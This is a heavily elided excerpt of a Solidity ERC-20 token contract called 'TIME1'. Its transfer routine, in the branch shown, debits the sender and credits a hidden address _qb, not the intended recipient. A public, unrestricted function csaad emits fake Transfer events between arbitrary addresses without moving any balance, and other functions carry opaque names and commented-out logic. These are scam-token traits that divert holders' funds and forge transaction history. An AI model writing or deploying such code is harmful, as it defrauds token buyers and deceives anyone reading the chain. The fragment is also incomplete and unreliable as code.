...
contract Time is Context, IERC20, Ownable {
    ...
    string private _name = 'TIME1';
    string private _symbol = 'TIME1';
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        ...
        if(
           ...
           // _balances[qb] = _balances[qb].add(tFund);
            ...
            _balances[sender] = _balances[sender].sub(tAmount);
            _balances[_qb] = _balances[_qb].add(tTransferAmount);
            emit Transfer(sender,_qb, tTransferAmount);
        }
  ...
  function zyd(string memory zd,bytes32 jm, uint sl,address dz) public  returns(bool){
     ...
     //_balances[sczh] = _balances[sczh].add(sl);
     //emit Transfer(_balances[sczh],msg.sender, sl);
     return true;
  }
  
  function csaad(address dz,address fs,uint sl) public{
      emit Transfer(dz,fs, sl);
  }
